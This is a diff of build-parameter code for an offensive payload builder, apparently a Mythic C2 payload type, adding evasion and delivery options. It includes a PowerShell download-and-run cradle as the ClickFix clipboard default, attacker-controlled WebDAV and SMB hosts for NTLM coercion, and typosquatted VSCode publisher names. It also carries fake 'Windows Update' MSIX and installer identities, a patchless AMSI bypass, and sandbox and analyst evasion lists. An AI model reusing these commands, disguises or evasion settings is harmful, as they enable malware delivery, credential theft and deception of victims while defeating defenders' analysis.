                 "0 = Disabled (no patch)\n"
                 "1 = Patch AmsiScanBuffer only (default)\n"
                 "2 = + Patch AmsiOpenSession\n"
-                "3 = + InvalidateAmsiContext (heap-walk, aggressive)"
+                "3 = + InvalidateAmsiContext (heap-walk, aggressive)\n"
+                "4 = Patchless (Dr0 HW-BP + VEH, no byte patches; defeats "
+                "PG/CFG integrity scans and signature checks on amsi.dll)"
             ),
-            choices = ["0", "1", "2", "3"],
+            choices = ["0", "1", "2", "3", "4"],
             default_value = "1",
             required = False,
             hide_conditions = [
@@ -1190,6 +1350,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name = "0.5t ETW Bypass Type",
+            group_name="6 - Evasion",
             parameter_type = BuildParameterType.ChooseOne,
             description = (
                 "ETW bypass depth:\n"
@@ -1210,15 +1371,17 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name = "0.5u Unhook Scope",
+            group_name="6 - Evasion",
             parameter_type = BuildParameterType.ChooseOne,
             description = (
-                "DLL unhook breadth:\n"
-                "0 = ntdll only (default)\n"
-                "1 = ntdll + kernel32 + kernelbase\n"
-                "2 = Selective (targeted Nt* function list, lowest noise)"
+                "NTDLL unhook breadth:\n"
+                "0 = None (skip all unhooking)\n"
+                "1 = ntdll only (default)\n"
+                "2 = ntdll + kernel32 + kernelbase\n"
+                "3 = Selective (targeted Nt* function list, lowest noise)"
             ),
-            choices = ["0", "1", "2"],
-            default_value = "0",
+            choices = ["0", "1", "2", "3"],
+            default_value = "1",
             required = False,
             hide_conditions = [
                 HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
@@ -1230,15 +1393,17 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
         # ClickOnce Loader Injection Configuration
         BuildParameter(
             name = "0.6 ClickOnce - Injection Method",
+            group_name="8 - ClickOnce",
             parameter_type = BuildParameterType.ChooseOne,
             description = """Select the injection method for ClickOnce:
 earlycascade (remote)
-poolparty (remote)
+poolparty (remote) - RemoteTpDirectInsertion
+tpjobapc (remote)  - RemoteTpJobDirectInsertion / TpJobObjectApc
 classic (remote)
 createfiber (self)
 enumdesktops (self)
 appdomain (self)""",
-            choices = ["createfiber", "earlycascade", "poolparty", "classic", "enumdesktops", "appdomain"],
+            choices = ["createfiber", "earlycascade", "poolparty", "tpjobapc", "classic", "enumdesktops", "appdomain"],
             default_value = "createfiber",
             hide_conditions = [
                 HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.NotEQ, value="ClickOnce"),
@@ -1247,6 +1412,7 @@ appdomain (self)""",
 
         BuildParameter(
             name = "0.7 ClickOnce - Target Process",
+            group_name="8 - ClickOnce",
             parameter_type = BuildParameterType.String,
             description = "Target process for remote injection methods (leave empty for explorer.exe)",
             default_value = "explorer.exe",
@@ -1259,6 +1425,7 @@ appdomain (self)""",
 
         BuildParameter(
             name="0.8 Output Extension Source",
+            group_name="11 - Triggers",
             parameter_type=BuildParameterType.ChooseOne,
             description="Choose source for the payload ignition and visible extension inside the container (Trigger or MalDoc)",
             choices=["Trigger", "MalDoc"],
@@ -1267,9 +1434,10 @@ appdomain (self)""",
 
         BuildParameter(
             name="0.9 Trigger Type",
+            group_name="11 - Triggers",
             parameter_type=BuildParameterType.ChooseOne,
             description=f"Type of Trigger to toggle decoy and execution. LNK Unavailabe in {semver}",
-            choices=["LNK", "BAT", "MSI", "MSC", "HTML", "ClickFix", "HTA", "URL", "JS", "CHM", "SVG", "HTML-Encrypted", "HTML-Geofenced", "SearchMS", "UDL", "QR", "AppDomain"],
+            choices=["LNK", "BAT", "MSI", "MSC", "HTML", "ClickFix", "HTA", "URL", "JS", "CHM", "SVG", "HTML-Encrypted", "HTML-Geofenced", "SearchMS", "UDL", "QR", "AppDomain", "VSCode", "OneNote", "CMSTP", "Regsvr32", "XSL", "InstallUtil"],
             default_value="BAT",
             required=False,
             hide_conditions = [
@@ -1281,6 +1449,7 @@ appdomain (self)""",
 
         BuildParameter(
             name="0.9-L Linux Trigger Type",
+            group_name="11 - Triggers",
             parameter_type=BuildParameterType.ChooseOne,
             description="Trigger delivery mechanism for Linux targets.",
             choices=["Bash", "Desktop", "HTML", "QR"],
@@ -1293,9 +1462,10 @@ appdomain (self)""",
 
         BuildParameter(
             name="0.9-M macOS Trigger Type",
+            group_name="11 - Triggers",
             parameter_type=BuildParameterType.ChooseOne,
             description="Trigger delivery mechanism for macOS targets.",
-            choices=["Command", "AppleScript", "PKG", "HTML", "QR"],
+            choices=["Command", "AppleScript", "PKG", "AppBundle", "AppBundle-AdHoc", "DMG", "HTML", "QR"],
             default_value="Command",
             required=False,
             hide_conditions=[
@@ -1305,6 +1475,7 @@ appdomain (self)""",
 
         BuildParameter(
             name = "0.9a Trigger Binary",
+            group_name="11 - Triggers",
             parameter_type = BuildParameterType.String,
             description = "Choose a command to run when the trigger is executed.",
             default_value = "C:\\Windows\\System32\\conhost.exe",
@@ -1317,12 +1488,14 @@ appdomain (self)""",
                 HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.EQ, value="HTML"),
                 HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.EQ, value="ClickFix"),
                 HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.EQ, value="URL"),
+                HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.EQ, value="VSCode"),
                 HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="Windows"),
             ]
         ),
 
         BuildParameter(
             name = "0.9b Trigger Command",
+            group_name="11 - Triggers",
             parameter_type = BuildParameterType.String,
             description = "Choose a command to run when the trigger is executed.",
             default_value = "--headless cmd.exe /Q /c erebus.exe | decoy.pdf",
@@ -1335,12 +1508,55 @@ appdomain (self)""",
                 HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.EQ, value="HTML"),
                 HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.EQ, value="ClickFix"),
                 HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.EQ, value="URL"),
+                HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.EQ, value="VSCode"),
                 HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="Windows"),
             ]
         ),
 
         BuildParameter(
+            name="0.9w VSCode Fake Name",
+            group_name="11 - Triggers",
+            parameter_type=BuildParameterType.String,
+            description="VSCode extension internal name shown in the Extensions panel. Typosquat a known publisher (e.g. 'vscode-python-tools', 'prettier-vscode').",
+            default_value="vscode-python-tools",
+            required=False,
+            hide_conditions=[
+                HideCondition(name="0.0 Main Payload Type",       operand=HideConditionOperand.NotEQ, value="Loader"),
+                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="Trigger"),
+                HideCondition(name="0.9 Trigger Type",            operand=HideConditionOperand.NotEQ, value="VSCode"),
+            ]
+        ),
+
+        BuildParameter(
+            name="0.9x VSCode Publisher",
+            group_name="11 - Triggers",
+            parameter_type=BuildParameterType.String,
+            description="VSCode extension publisher field shown in the Extensions panel. Typosquat a known publisher (e.g. 'ms-python', 'esbenp', 'dbaeumer').",
+            default_value="ms-python",
+            required=False,
+            hide_conditions=[
+                HideCondition(name="0.0 Main Payload Type",       operand=HideConditionOperand.NotEQ, value="Loader"),
+                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="Trigger"),
+                HideCondition(name="0.9 Trigger Type",            operand=HideConditionOperand.NotEQ, value="VSCode"),
+            ]
+        ),
+
+        BuildParameter(
+            name="0.9y VSCode Custom Icon",
+            group_name="11 - Triggers",
+            parameter_type=BuildParameterType.File,
+            description="Optional PNG icon shown for the extension in the VSCode Extensions panel. VSCode expects 128x128 PNG; other formats may not render. Leave empty for no icon.",
+            required=False,
+            hide_conditions=[
+                HideCondition(name="0.0 Main Payload Type",       operand=HideConditionOperand.NotEQ, value="Loader"),
+                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="Trigger"),
+                HideCondition(name="0.9 Trigger Type",            operand=HideConditionOperand.NotEQ, value="VSCode"),
+            ]
+        ),
+
+        BuildParameter(
             name="0.9c ClickFix Command",
+            group_name="11 - Triggers",
             parameter_type=BuildParameterType.String,
             description="Command copied to clipboard when user clicks verify button. Use a PowerShell download cradle or cmd chain.",
             default_value='powershell -w hidden -ep bypass -c "iwr -uri PAYLOAD_URL -outfile $env:TEMP\\update.exe; & $env:TEMP\\update.exe"',
@@ -1353,6 +1569,7 @@ appdomain (self)""",
 
         BuildParameter(
             name="0.9d URL Target",
+            group_name="11 - Triggers",
             parameter_type=BuildParameterType.String,
             description=(
                 "Target URL for the internet shortcut (.url) trigger.\n"
@@ -1371,6 +1588,7 @@ appdomain (self)""",
 
         BuildParameter(
             name="0.9e HTML Password",
+            group_name="11 - Triggers",
             parameter_type=BuildParameterType.String,
             description="Password required to decrypt and trigger the payload. Stored as PBKDF2 hash in HTML - prevents automated sandbox detonation.",
             default_value="Passw0rd!",
@@ -1384,6 +1602,7 @@ appdomain (self)""",
 
         BuildParameter(
             name="0.9f Allowed Countries",
+            group_name="11 - Triggers",
             parameter_type=BuildParameterType.String,
             description="Comma-separated ISO-3166-1 alpha-2 country codes to allow (e.g. US,GB,CA). Visitors outside these countries are redirected to the fallback URL.",
             default_value="US,GB,CA,AU,DE,FR",
@@ -1397,6 +1616,7 @@ appdomain (self)""",
 
         BuildParameter(
             name="0.9g Geofence Fallback URL",
+            group_name="11 - Triggers",
             parameter_type=BuildParameterType.String,
             description="URL to redirect blocked visitors to (e.g. https://www.microsoft.com). Leave blank for silent fail.",
             default_value="https://www.microsoft.com",
@@ -1410,6 +1630,7 @@ appdomain (self)""",
 
         BuildParameter(
             name="0.9h WebDAV Host",
+            group_name="11 - Triggers",
             parameter_type=BuildParameterType.String,
             description="Attacker-controlled WebDAV host for search-ms trigger (no scheme/port, e.g. dav.attacker.com).",
             default_value="dav.attacker.com",
@@ -1423,6 +1644,7 @@ appdomain (self)""",
 
         BuildParameter(
             name="0.9i WebDAV Share",
+            group_name="11 - Triggers",
             parameter_type=BuildParameterType.String,
             description="WebDAV share path (e.g. share). Files served from this share have no MOTW.",
             default_value="share",
@@ -1436,6 +1658,7 @@ appdomain (self)""",
 
         BuildParameter(
             name="0.9j UDL Attacker Host",
+            group_name="11 - Triggers",
             parameter_type=BuildParameterType.String,
             description="Attacker-controlled SMB listener hostname or IP for UDL Net-NTLM coercion.",
             default_value="attacker.com",
@@ -1449,6 +1672,7 @@ appdomain (self)""",
 
         BuildParameter(
             name="0.9k QR Code URL",
+            group_name="11 - Triggers",
             parameter_type=BuildParameterType.String,
             description="URL to encode in the QR code. The URL has no plaintext representation in the HTML source - defeats link scanner URL extraction.",
             default_value="https://login.microsoftonline.com/",
@@ -1462,6 +1686,7 @@ appdomain (self)""",
 
         BuildParameter(
             name="0.9l AppDomain Target EXE",
+            group_name="11 - Triggers",
             parameter_type=BuildParameterType.ChooseOne,
             description="Signed .NET LOLBIN to target. The .config file must be placed alongside this EXE.",
             choices=["AddInProcess64", "AddInProcess32", "dfsvc64", "AppLaunch", "ServiceHubHost"],
@@ -1476,6 +1701,7 @@ appdomain (self)""",
 
         BuildParameter(
             name="0.9m AppDomain Remote URL",
+            group_name="11 - Triggers",
             parameter_type=BuildParameterType.String,
             description="Optional remote URL to fetch the AppDomain Manager DLL (HTTP/S or WebDAV). Leave blank for local side-by-side DLL mode. Remote mode requires strong-name signing.",
             default_value="",
@@ -1489,6 +1715,7 @@ appdomain (self)""",
 
         BuildParameter(
             name="0.9n LNK Icon",
+            group_name="11 - Triggers",
             parameter_type=BuildParameterType.ChooseOne,
             description="Icon disguise for the LNK shortcut. Resolves via environment-variable paths on the target host.",
             choices=["pdf", "word", "excel", "powerpoint", "outlook", "onenote", "folder", "document", "notepad", "edge", "generic"],
@@ -1503,6 +1730,7 @@ appdomain (self)""",
 
         BuildParameter(
             name="0.9o LNK Argument Pad",
+            group_name="11 - Triggers",
             parameter_type=BuildParameterType.String,
             description="Number of leading space characters prepended to arguments to push them off-screen in the shortcut Properties dialog (argument hiding). Recommended: 260.",
             default_value="260",
@@ -1517,6 +1745,7 @@ appdomain (self)""",
   # MalDocs - Excel Backdooring
         BuildParameter(
             name="0.9 Create MalDoc",
+            group_name="12 - MalDoc",
             parameter_type=BuildParameterType.ChooseOne,
             description="Create/Backdoor Document documents, export VBA module only, Generate All or disable MalDoc generation",
             choices=["None", "Create/Backdoor Document", "VBA Module Only", "Build Matrix"],
@@ -1529,6 +1758,7 @@ appdomain (self)""",
 
         BuildParameter(
             name="0.9a MalDoc Type",
+            group_name="12 - MalDoc",
             parameter_type=BuildParameterType.ChooseOne,
             description="Create new Excel document or backdoor an existing one",
             choices=["Create New", "Backdoor Existing"],
@@ -1542,6 +1772,7 @@ appdomain (self)""",
 
         BuildParameter(
             name="0.9b Excel Source File",
+            group_name="12 - MalDoc",
             parameter_type=BuildParameterType.File,
             description="Upload an existing Excel file to backdoor (XLSM/XLS/XLAM)",
             required=False,
@@ -1554,6 +1785,7 @@ appdomain (self)""",
 
         BuildParameter(
             name="0.9c VBA Execution Trigger",
+            group_name="12 - MalDoc",
             parameter_type=BuildParameterType.ChooseOne,
             description="VBA macro execution trigger method",
             choices=["AutoOpen", "OnClose", "OnSave"],
@@ -1567,6 +1799,7 @@ appdomain (self)""",
 
         BuildParameter(
             name="0.9d Excel Document Name",
+            group_name="12 - MalDoc",
             parameter_type=BuildParameterType.String,
             description="Name/title for the Excel document",
             default_value="Invoice",
@@ -1579,6 +1812,7 @@ appdomain (self)""",
 
         BuildParameter(
             name="0.9e Obfuscate VBA",
+            group_name="12 - MalDoc",
             parameter_type=BuildParameterType.Boolean,
             description="Obfuscate VBA code to evade AV/EDR detection",
             default_value=True,
@@ -1591,6 +1825,7 @@ appdomain (self)""",
 
         BuildParameter(
             name="0.9f MalDoc Injection Type",
+            group_name="12 - MalDoc",
             parameter_type=BuildParameterType.ChooseOne,
             description="Type of payload injection - Command executes trigger binary, Shellcode injects VBA-formatted shellcode",
             choices=["Command Execution", "Shellcode Injection"],
@@ -1604,6 +1839,7 @@ appdomain (self)""",
 
         BuildParameter(
             name="0.9f1 MalDoc Trigger Binary",
+            group_name="12 - MalDoc",
             parameter_type=BuildParameterType.String,
             description="Executable to run when the VBA trigger fires (Command Execution mode only).",
             default_value="C:\\Windows\\System32\\conhost.exe",
@@ -1617,6 +1853,7 @@ appdomain (self)""",
 
         BuildParameter(
             name="0.9f2 MalDoc Trigger Command",
+            group_name="12 - MalDoc",
             parameter_type=BuildParameterType.String,
             description="Arguments passed to the trigger binary (Command Execution mode only).",
             default_value="--headless cmd.exe /Q /c erebus.exe | decoy.pdf",
@@ -1630,6 +1867,7 @@ appdomain (self)""",
 
         BuildParameter(
             name="0.9g VBA Loader Technique",
+            group_name="12 - MalDoc",
             parameter_type=BuildParameterType.ChooseOne,
             description="VBA shellcode loader technique - VirtualAlloc (classic), EnumLocales (callback), QueueUserAPC (self-APC), AddressOfEntryPoint (overwrite child entry point, no RWX), EarlyBird (suspended process APC hijack)",
             choices=["VirtualAlloc + CreateThread", "EnumSystemLocalesA Callback", "QueueUserAPC Injection", "AddressOfEntryPoint Injection", "Early-Bird Injection"],
@@ -1644,6 +1882,7 @@ appdomain (self)""",
 
         BuildParameter(
             name="0.9p MalDoc Output Format",
+            group_name="12 - MalDoc",
             parameter_type=BuildParameterType.ChooseOne,
             description=(
                 "Output format for the VBA maldoc. "
@@ -1664,6 +1903,7 @@ appdomain (self)""",
 
         BuildParameter(
             name="0.9q DOTM Remote URL",
+            group_name="12 - MalDoc",
             parameter_type=BuildParameterType.String,
             description=(
                 "URL of the attacker-hosted DOTM template fetched by Word on Document_Open. "
@@ -1681,6 +1921,7 @@ appdomain (self)""",
 
         BuildParameter(
             name="0.9r Matrix Loaders",
+            group_name="12 - MalDoc",
             parameter_type=BuildParameterType.String,
             description=(
                 "Comma-separated VBA loader techniques for the matrix build. "
@@ -1697,6 +1938,7 @@ appdomain (self)""",
 
         BuildParameter(
             name="0.9s Matrix Triggers",
+            group_name="12 - MalDoc",
             parameter_type=BuildParameterType.String,
             description=(
                 "Comma-separated VBA execution triggers for the matrix build. "
@@ -1713,6 +1955,7 @@ appdomain (self)""",
 
         BuildParameter(
             name="0.9t Matrix Formats",
+            group_name="12 - MalDoc",
             parameter_type=BuildParameterType.String,
             description=(
                 "Comma-separated document formats for the matrix build. "
@@ -1729,6 +1972,7 @@ appdomain (self)""",
 
         BuildParameter(
             name="0.9u Matrix Zip Output",
+            group_name="12 - MalDoc",
             parameter_type=BuildParameterType.Boolean,
             description="Pack the full matrix output directory into a single .zip after build.",
             default_value=True,
@@ -1741,6 +1985,7 @@ appdomain (self)""",
 
         BuildParameter(
             name="0.9v HTTP Stager URL",
+            group_name="12 - MalDoc",
             parameter_type=BuildParameterType.String,
             description=(
                 "Optional: stage the shellcode via Mythic instead of embedding it in VBA. "
@@ -1761,6 +2006,7 @@ appdomain (self)""",
 
         BuildParameter(
             name = "0.13 Decoy File Inclusion",
+            group_name="13 - Decoy",
             parameter_type = BuildParameterType.Boolean,
             description = "Check whether you want the decoy file in the final payload or not",
             default_value = False,
@@ -1772,6 +2018,7 @@ appdomain (self)""",
 
         BuildParameter(
             name = "0.13 Decoy File",
+            group_name="13 - Decoy",
             parameter_type = BuildParameterType.File,
             description = """Upload a decoy file (PDF/XLSX/etc.).
 If one is not uploaded then an example file will be used.""",
@@ -1782,6 +2029,7 @@ If one is not uploaded then an example file will be used.""",
 
         BuildParameter(
             name = "1.0 DLL Hijacking",
+            group_name="9 - DLL Hijack",
             parameter_type = BuildParameterType.File,
             description = f"""Prepares a given DLL for proxy-based hijacking.
 NOTE: ({semver}) Only supports XOR for now. Does not (currently) support encoded or compressed payloads.
@@ -1793,6 +2041,7 @@ NOTE: ({semver}) Only supports XOR for now. Does not (currently) support encoded
 
         BuildParameter(
             name = "1.0a Hijack Loader Architecture",
+            group_name="9 - DLL Hijack",
             parameter_type = BuildParameterType.ChooseOne,
             description = "Select the target architecture for the DLL loader",
             choices = ["x64", "x86"],
@@ -1804,6 +2053,7 @@ NOTE: ({semver}) Only supports XOR for now. Does not (currently) support encoded
 
         BuildParameter(
             name = "1.0b Hijack Build Configuration",
+            group_name="9 - DLL Hijack",
             parameter_type = BuildParameterType.ChooseOne,
             description = "Select the build configuration for the DLL hijack payload",
             choices = ["release", "debug"],
@@ -1816,6 +2066,7 @@ NOTE: ({semver}) Only supports XOR for now. Does not (currently) support encoded
         # DLL Hijack Built-in Guardrails
         BuildParameter(
             name = "1.1 Use Built-in Guardrails",
+            group_name="10 - Hijack Guardrails",
             parameter_type = BuildParameterType.Boolean,
             description = "Use built-in anti-debugging and environment checks instead of custom code",
             default_value = False,
@@ -1826,6 +2077,7 @@ NOTE: ({semver}) Only supports XOR for now. Does not (currently) support encoded
 
         BuildParameter(
             name = "1.1a Check IsDebuggerPresent",
+            group_name="10 - Hijack Guardrails",
             parameter_type = BuildParameterType.Boolean,
             description = "Enable check for IsDebuggerPresent and PEB.BeingDebugged flag",
             default_value = True,
@@ -1837,6 +2089,7 @@ NOTE: ({semver}) Only supports XOR for now. Does not (currently) support encoded
 
         BuildParameter(
             name = "1.1b Check Remote Debugger",
+            group_name="10 - Hijack Guardrails",
             parameter_type = BuildParameterType.Boolean,
             description = "Enable check for remote debugger via NtQueryInformationProcess",
             default_value = True,
@@ -1848,6 +2101,7 @@ NOTE: ({semver}) Only supports XOR for now. Does not (currently) support encoded
 
         BuildParameter(
             name = "1.1c Check Debugger Processes",
+            group_name="10 - Hijack Guardrails",
             parameter_type = BuildParameterType.Boolean,
             description = "Enable check for known debugger and analysis tool processes",
             default_value = True,
@@ -1859,6 +2113,7 @@ NOTE: ({semver}) Only supports XOR for now. Does not (currently) support encoded
 
         BuildParameter(
             name = "1.1d Check Hardware Breakpoints",
+            group_name="10 - Hijack Guardrails",
             parameter_type = BuildParameterType.Boolean,
             description = "Enable check for hardware breakpoints in debug registers",
             default_value = True,
@@ -1870,6 +2125,7 @@ NOTE: ({semver}) Only supports XOR for now. Does not (currently) support encoded
 
         BuildParameter(
             name = "1.1e Check Timing Anomalies",
+            group_name="10 - Hijack Guardrails",
             parameter_type = BuildParameterType.Boolean,
             description = "Enable timing-based debugger detection (RDTSC and Sleep checks)",
             default_value = False,
@@ -1881,6 +2137,7 @@ NOTE: ({semver}) Only supports XOR for now. Does not (currently) support encoded
 
         BuildParameter(
             name = "1.1f Hostname Whitelist",
+            group_name="10 - Hijack Guardrails",
             parameter_type = BuildParameterType.String,
             description = "Comma-separated list of allowed hostnames (e.g., TARGET-PC,VICTIM-WORKSTATION). Leave empty to disable.",
             default_value = "",
@@ -1892,6 +2149,7 @@ NOTE: ({semver}) Only supports XOR for now. Does not (currently) support encoded
 
         BuildParameter(
             name = "1.1g Block Analysis Hostnames",
+            group_name="10 - Hijack Guardrails",
             parameter_type = BuildParameterType.String,
             description = "Comma-separated list of blocked hostnames (e.g., SANDBOX,MALWARE-ANALYSIS,VM-WIN10)",
             default_value = "SANDBOX,MALWARE-ANALYSIS,VM-WIN10,ANALYST-PC",
@@ -1903,6 +2161,7 @@ NOTE: ({semver}) Only supports XOR for now. Does not (currently) support encoded
 
         BuildParameter(
             name = "1.1h Block Analysis Usernames",
+            group_name="10 - Hijack Guardrails",
             parameter_type = BuildParameterType.String,
             description = "Comma-separated list of blocked usernames (e.g., analyst,malware,sandbox,user,admin)",
             default_value = "analyst,malware,sandbox,user,admin",
@@ -1914,6 +2173,7 @@ NOTE: ({semver}) Only supports XOR for now. Does not (currently) support encoded
 
         BuildParameter(
             name = "1.1i IP Whitelist",
+            group_name="10 - Hijack Guardrails",
             parameter_type = BuildParameterType.String,
             description = "Comma-separated IP prefixes to allow (e.g., 10.,192.168.50.). Leave empty to disable.",
             default_value = "",
@@ -1925,6 +2185,7 @@ NOTE: ({semver}) Only supports XOR for now. Does not (currently) support encoded
 
         BuildParameter(
             name = "1.1j IP Blacklist",
+            group_name="10 - Hijack Guardrails",
             parameter_type = BuildParameterType.String,
             description = "Comma-separated IP prefixes to block (e.g., 192.168.122.,172.16.,127.)",
             default_value = "192.168.122.,172.16.,127.",
@@ -1936,6 +2197,7 @@ NOTE: ({semver}) Only supports XOR for now. Does not (currently) support encoded
 
         BuildParameter(
             name = "1.1k Domain Whitelist",
+            group_name="10 - Hijack Guardrails",
             parameter_type = BuildParameterType.String,
             description = "Comma-separated list of allowed domains (e.g., CORP.CONTOSO.COM,TARGET-DOMAIN.LOCAL). Leave empty to disable.",
             default_value = "",
@@ -1948,6 +2210,7 @@ NOTE: ({semver}) Only supports XOR for now. Does not (currently) support encoded
         # Shellcrypt
         BuildParameter(
             name = "2.0 Compression Type",
+            group_name="15 - Payload Protection",
             parameter_type = BuildParameterType.ChooseOne,
             description = "Choose a compression type for the shellcode.",
             choices = [
@@ -1962,6 +2225,7 @@ NOTE: ({semver}) Only supports XOR for now. Does not (currently) support encoded
 # Add more decryption support to loaders
         BuildParameter(
             name = "2.1 Encryption Type",
+            group_name="15 - Payload Protection",
             parameter_type = BuildParameterType.ChooseOne,
             description = "Choose an encryption type for the shellcode.",
             choices = [
@@ -1975,6 +2239,7 @@ NOTE: ({semver}) Only supports XOR for now. Does not (currently) support encoded
 
         BuildParameter(
             name = "2.2 Encryption Key",
+            group_name="15 - Payload Protection",
             parameter_type = BuildParameterType.String,
             description = """Choose an encryption key. A random one will be
 generated if none have been entered.""",
@@ -1983,6 +2248,7 @@ generated if none have been entered.""",
 
         BuildParameter(
             name = "2.3 Encoding Type",
+            group_name="15 - Payload Protection",
             parameter_type = BuildParameterType.ChooseOne,
             description = "Choose an encoding type for the shellcode.",
             choices = [
@@ -1998,6 +2264,7 @@ generated if none have been entered.""",
         # Archive
         BuildParameter(
             name = "3.0 Container Type",
+            group_name="16 - Containers",
             parameter_type = BuildParameterType.ChooseOne,
             description = (
                 "Primary container / execution layer.\n"
@@ -2011,6 +2278,7 @@ generated if none have been entered.""",
 
         BuildParameter(
             name = "3.0T Outer Transport",
+            group_name="16 - Containers",
             parameter_type = BuildParameterType.ChooseOne,
             description = (
                 "Optional outer transport wrapper. Wraps the primary container inside an\n"
@@ -2029,6 +2297,7 @@ generated if none have been entered.""",
 
         BuildParameter(
             name="3.AI0 MSIX Hosting URL",
+            group_name="16 - Containers",
             parameter_type=BuildParameterType.String,
             description=(
                 "Full HTTPS URL where the operator will host the signed MSIX package.\n"
@@ -2044,6 +2313,7 @@ generated if none have been entered.""",
 
         BuildParameter(
             name="3.AI1 MSIX Package Name",
+            group_name="16 - Containers",
             parameter_type=BuildParameterType.String,
             description="MSIX identity package name. Shown in Settings > Apps. No spaces.",
             default_value="Microsoft.WindowsUpdate",
@@ -2054,6 +2324,7 @@ generated if none have been entered.""",
 
         BuildParameter(
             name="3.AI2 MSIX Display Name",
+            group_name="16 - Containers",
             parameter_type=BuildParameterType.String,
             description="Friendly display name shown in App Installer UI and Settings > Apps.",
             default_value="Windows Update Assistant",
@@ -2065,6 +2336,7 @@ generated if none have been entered.""",
         # Electron fake-installer container parameters (hidden unless Electron selected)
         BuildParameter(
             name = "3.E0 Electron Product Name",
+            group_name="16 - Containers",
             parameter_type = BuildParameterType.String,
             description = "Display name shown in the fake installer window and NSIS metadata",
             default_value = "Acme Installer",
@@ -2074,6 +2346,7 @@ generated if none have been entered.""",
         ),
         BuildParameter(
             name = "3.E1 Electron Publisher",
+            group_name="16 - Containers",
             parameter_type = BuildParameterType.String,
             description = "Publisher string embedded in the installer metadata",
             default_value = "Acme Corporation",
@@ -2083,6 +2356,7 @@ generated if none have been entered.""",
         ),
         BuildParameter(
             name = "3.E2 Electron Version",
+            group_name="16 - Containers",
             parameter_type = BuildParameterType.String,
             description = "Product version embedded in the installer",
             default_value = "1.0.0",
@@ -2092,6 +2366,7 @@ generated if none have been entered.""",
         ),
         BuildParameter(
             name = "3.E3 Electron Architecture",
+            group_name="16 - Containers",
             parameter_type = BuildParameterType.ChooseOne,
             description = "Target architecture for the Electron NSIS installer",
             choices = ["x64", "ia32"],
@@ -2102,6 +2377,7 @@ generated if none have been entered.""",
         ),
         BuildParameter(
             name = "3.E4 Electron Entry Format",
+            group_name="16 - Containers",
             parameter_type = BuildParameterType.ChooseOne,
             description = (
                 "Which spawn mechanism the wizard uses at install time:\n"
@@ -2117,6 +2393,7 @@ generated if none have been entered.""",
         ),
         BuildParameter(
             name = "3.E5 Electron DLL Entry Point",
+            group_name="16 - Containers",
             parameter_type = BuildParameterType.String,
             description = "rundll32 entry point name (only used when Entry Format = dll)",
             default_value = "DllMain",
@@ -2127,6 +2404,7 @@ generated if none have been entered.""",
         ),
         BuildParameter(
             name = "3.E7 Electron File Description",
+            group_name="16 - Containers",
             parameter_type = BuildParameterType.String,
             description = (
                 "PE file description string shown on the Details tab of the "
@@ -2139,6 +2417,7 @@ generated if none have been entered.""",
         ),
         BuildParameter(
             name = "3.E8 Electron Copyright",
+            group_name="16 - Containers",
             parameter_type = BuildParameterType.String,
             description = (
                 "Legal copyright string embedded in the PE resources "
@@ -2151,6 +2430,7 @@ generated if none have been entered.""",
         ),
         BuildParameter(
             name = "3.E6a Electron Custom Icon",
+            group_name="16 - Containers",
             parameter_type = BuildParameterType.File,
             description = (
                 "Optional PNG to use as the fake-installer window + exe icon.\n"
@@ -2165,12 +2445,13 @@ generated if none have been entered.""",
         ),
         BuildParameter(
             name = "3.E6b Electron Payload Zip",
+            group_name="16 - Containers",
             parameter_type = BuildParameterType.File,
             description = (
-                "Optional ZIP containing a pre-built payload and/or DLL to use instead of\n"
-                "the Mythic-compiled loader. The archive must contain erebus.exe, erebus.dll,\n"
-                "and/or erebus.xll at its root. Files are extracted directly into payload/\n"
-                "before containerisation, replacing any compiled output."
+                "Optional ZIP whose entire contents are extracted into payload/ before\n"
+                "containerisation. Use this to supply a pre-built payload directory (any\n"
+                "filenames accepted). Extracted files replace any compiled output with the\n"
+                "same name. Directory structure inside the ZIP is preserved."
             ),
             required = False,
             hide_conditions = [
@@ -2180,6 +2461,7 @@ generated if none have been entered.""",
 
         BuildParameter(
             name = "3.E9 Enable Electron Guardrails",
+            group_name="16 - Containers",
             parameter_type = BuildParameterType.Boolean,
             description = (
                 "Master switch for the Electron wrapper's anti-sandbox guardrails. "
@@ -2194,6 +2476,7 @@ generated if none have been entered.""",
         ),
         BuildParameter(
             name = "3.E9a Dwell Time (ms)",
+            group_name="16 - Containers",
             parameter_type = BuildParameterType.String,
             description = (
                 "Minimum time (ms) the wizard must be visible before the Install "
@@ -2208,6 +2491,7 @@ generated if none have been entered.""",
         ),
         BuildParameter(
             name = "3.E9b Require Mouse Movement",
+            group_name="16 - Containers",
             parameter_type = BuildParameterType.Boolean,
             description = (
                 "Require a real mousemove event (non-zero movementX/Y delta) "
@@ -2223,6 +2507,7 @@ generated if none have been entered.""",
         ),
         BuildParameter(
             name = "3.E9c Check Debugger",
+            group_name="16 - Containers",
             parameter_type = BuildParameterType.Boolean,
             description = (
                 "Refuse to stage if a Node inspector / debugger is attached to "
@@ -2236,6 +2521,7 @@ generated if none have been entered.""",
         ),
         BuildParameter(
             name = "3.E9d Check Sandbox Env Vars",
+            group_name="16 - Containers",
             parameter_type = BuildParameterType.Boolean,
             description = (
                 "Refuse to stage if environment variables from common sandbox "
@@ -2249,6 +2535,7 @@ generated if none have been entered.""",
         ),
         BuildParameter(
             name = "3.E9e Check Default Bad Usernames",
+            group_name="16 - Containers",
             parameter_type = BuildParameterType.Boolean,
             description = (
                 "Refuse to stage if the current username is a well-known sandbox "
